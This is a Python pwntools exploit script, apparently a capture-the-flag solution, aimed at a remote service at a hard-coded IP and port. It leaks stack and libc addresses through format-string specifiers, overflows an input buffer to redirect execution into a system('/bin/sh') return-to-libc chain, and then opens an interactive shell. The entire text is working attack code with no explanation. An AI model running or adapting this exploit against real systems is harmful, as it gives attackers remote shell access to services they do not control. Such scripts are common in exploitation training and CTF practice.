from pwn import *
from LD import*
#context.log_level ='DEBUG'
p = remote('47.99.176.38',5210)
p.recvuntil("Input your name:")
p.send("%17$p")
ret_esp = int(p.recv(10),16)
PI='\x00'*0x24 + p32(ret_esp +0x70 + 4)
p.send(PI)
p.recvuntil("Input your name:")
p.send('%25$p')
libc_base=int(p.recv(10),16)-0x1E2880
log.info('LIBC:\t' + hex(libc_base))
one_gadget=libc_base+0x3AC69
system = libc_base + 0x03A940
binsh = libc_base + 0x15902B
offset = ret_esp + 0x40 + 4
log.info('Ret:\t' + hex(ret_esp)  + '\nOFF:\t' +  hex(offset))
p.recvuntil('Input your info:')
PII  = p32(system) + p32(0) +p32(binsh)
PII = PII.ljust(0x24,'\x00')
PII +=p32(offset)
p.send(PII)
p.interactive()

